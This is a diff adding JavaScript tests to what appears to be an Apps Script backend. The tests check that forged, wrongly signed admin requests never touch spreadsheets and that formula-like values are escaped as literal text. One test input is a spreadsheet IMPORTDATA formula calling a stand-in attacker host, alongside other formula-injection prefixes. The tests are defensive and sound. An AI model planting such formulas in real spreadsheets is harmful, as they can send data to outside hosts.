@@ -121,3 +121,22 @@ test('sheet save locates UUID across blank rows; wrong destination and busy lock
   assert.equal(sheet.data[1][0], '')
   assert.equal(h.records().length, 1); assert.equal(h.records()[0].status, 'approved')
 })
+
+
+test('forged administrative and private-sheet requests never access spreadsheets',async()=>{
+  for(const kind of ['portal_list','portal_session','portal_assign_owner','admin_info','local_claim']){
+    const h=gasHarness();let reads=0
+    h.context.SpreadsheetApp.openById=()=>{reads++;throw Error('PRIVATE_SENTINEL')}
+    const envelope=await signEnvelope({kind,portalAdmin:true,actorRole:'admin',actorId:'444444444444444444'},'wrong-secret')
+    const result=post(h,envelope)
+    assert.equal(result.ok,false);assert.equal(reads,0);assert.equal(h.state.sheetWrites,0)
+    assert.doesNotMatch(JSON.stringify(result),/PRIVATE_SENTINEL|recordJson|accessToken/)
+  }
+})
+
+test('spreadsheet formula-looking values remain literal text',()=>{
+  const h=gasHarness()
+  for(const value of ['=IMPORTDATA("https://attacker.invalid")','+1','-1','@name',"'text"]){
+    assert.equal(h.context.safeCell_(value),"'"+value)
+  }
+})
